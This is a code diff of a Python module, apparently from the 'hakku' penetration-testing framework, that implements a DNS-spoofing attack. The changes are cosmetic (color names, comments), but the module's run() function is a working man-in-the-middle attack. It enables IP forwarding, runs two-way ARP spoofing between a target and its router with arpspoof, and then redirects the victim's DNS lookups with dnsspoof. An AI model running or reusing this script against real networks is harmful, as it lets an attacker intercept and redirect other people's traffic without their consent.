@@ -1,46 +1,46 @@
 #        Copyright (C) 2015 Noa-Emil Nissinen (4shadoww)
 import sys
-from core import bcolors
+from core import colors
 from collections import OrderedDict
 import os
 import time
 from core import getpath
 
-#info about module
-#modules name (must be same as filename)
-modulename = "dns_spoof"
-#module version
+# Info about the module
+# Module's name (should be same as file's name)
+name = "dns_spoof"
+# Module version
 version = "1.0"
-#description
+# Description
 desc = "dns spoof"
-#creator's github
+# Creator's github
 github = "4shadoww"
-#created by (creators name)
+# Creator's name
 createdby = "4shadoww"
-#email
+# Email
 email = "4shadoww0@gmail.com"
-#alert user if root permissions not available (remove variable below if root permissions needed)
+# Alert user if root permissions not available (remove variable below if root permissions not needed)
 needroot = 1
 
-#list of variables
+# List of the variables
 variables = OrderedDict((
 ('interface', 'eth0'),
 ('target', '192.168.1.2'),
 ('router', '192.168.1.1'),
 ))
 
-#description for variables
+# Description for variables
 vdesc = [
 'target interface',
 'target address',
 'router address',
 ]
 
-#additional help notes
-help_notes = bcolors.WARNING+"this module will not work without dsniff!"+bcolors.END
+# Additional help notes
+help_notes = colors.red+"this module will not work without dsniff!"+colors.end
 
-#additional notes to options
-option_notes = bcolors.WARNING+'remember to edit hostslist:\n'+getpath.conf()+"hosts"+bcolors.END
+# Additional notes to options
+option_notes = colors.red+'remember to edit hostslist:\n'+getpath.conf()+"hosts"+colors.end
 
 mhelp = OrderedDict((
 ('stop', 'end dnsspoof'),
@@ -56,19 +56,19 @@ changelog = "Version 1.0:\nrelease"
 
 def run():
 	hostslist = getpath.conf()+"hosts"
-	print(bcolors.OKBLUE+"ipv4 forwarding..."+bcolors.END)
+	print(colors.blue+"ipv4 forwarding..."+colors.end)
 	os.system('echo "1" >> /proc/sys/net/ipv4/ip_forward')
-	print(bcolors.OKBLUE+"starting arp spoof..."+bcolors.END)
+	print(colors.blue+"starting arp spoof..."+colors.end)
 	xterm1 = "xterm -e arpspoof -i "+ variables['interface']+ " -t "+ variables['target']+ " "+ variables['router'] + " &"
 	xterm2 = "xterm -e arpspoof -i "+ variables['interface']+ " -t "+ variables['router']+ " "+ variables['target'] + " &"
 	os.system(xterm1)
 	os.system(xterm2)
-	print(bcolors.OKBLUE+"waiting for arp spoof..."+bcolors.END)
+	print(colors.blue+"waiting for arp spoof..."+colors.end)
 	time.sleep(5)
-	print(bcolors.OKBLUE+"starting dns spoof..."+bcolors.END)
+	print(colors.blue+"starting dns spoof..."+colors.end)
 	xterm3 = "xterm -e dnsspoof -i "+ variables['interface']+ " -f "+ hostslist + " host " + variables['target']+ " &"
 	os.system(xterm3)
-	print(bcolors.OKBLUE+'use "stop" command to end'+bcolors.END)
+	print(colors.blue+'use "stop" command to end'+colors.end)
 
 def stop():
 	os.system("killall arpspoof")
